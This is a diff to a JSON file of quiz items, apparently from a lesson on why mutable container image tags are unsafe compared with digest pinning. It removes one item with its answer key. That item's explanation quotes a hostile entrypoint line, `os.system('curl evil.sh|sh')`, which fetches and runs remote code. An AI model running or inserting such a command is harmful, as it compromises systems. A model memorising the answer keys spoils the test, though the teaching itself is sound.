@@ -1,17 +1,5 @@
 [
   {
-    "stage": "pre",
-    "question": "Three nodes in one fleet run the same Deployment with `image: registry.internal/app:1.0`. Node A was scheduled Tuesday, node B came up Wednesday when the autoscaler added capacity, and node C rebooted at 02:03 Thursday after a kernel patch and pulled fresh because its disk cache was gone. A bug reproduces on one node in six. What is the most likely explanation, and what would your tooling tell you?",
-    "options": [
-      "The nodes have different kernel or CPU features, so the same bytes behave differently — compare `uname -r` and the node labels",
-      "Node C's pull was interrupted and it is running a partially-extracted image; the layer digests on disk will not match the manifest",
-      "They are running three different builds. A tag is a mutable pointer in the registry's database, so a re-push between Tuesday and Thursday changes what the identical reference string resolves to — and nothing reports it, because every pod's `APP_VERSION` still says 1.0 and every dashboard aggregates all three",
-      "Kubernetes cached the manifest at the first pull, so nodes B and C are running a stale copy of an image that has since been corrected"
-    ],
-    "correct": 2,
-    "explanation": "This is the misconception the lesson exists to remove: a tag is not a version, it is a name in a mutable key-value table `(repository, tag) -> manifest digest` that anybody with push access can re-point in one database write — no new identifier, no version bump, no audit trail a client can see. The lesson measured exactly this: two pulls of the byte-identical reference `registry.internal/app:1.0` returned `sha256:f29d198c...` and `sha256:2e3da6b0...`, with the second entrypoint carrying `os.system('curl evil.sh|sh')` while still reporting build 8f21c4 — because the attacker wrote that string and nothing in the pull path can contradict it. Option 4 is nearly the opposite of the truth: pulls are cached by *content*, so a cached layer is always valid. The benign version of this failure is a careless colleague; the hostile version is a leaked CI token, and both are the same one-line write. Pulling by tag is trust-on-every-pull, forever, on every reboot and every autoscale event."
-  },
-  {
     "stage": "check",
     "question": "You are pinning images by digest for the first time. `crane digest registry.internal/app:1.1` on your amd64 CI runner prints `sha256:021ff5d9dff0...`, so you write that into the Deployment. Everything works for months. Then the platform team adds an arm64 node pool and pods scheduled there fail to start. What went wrong?",
     "options": [
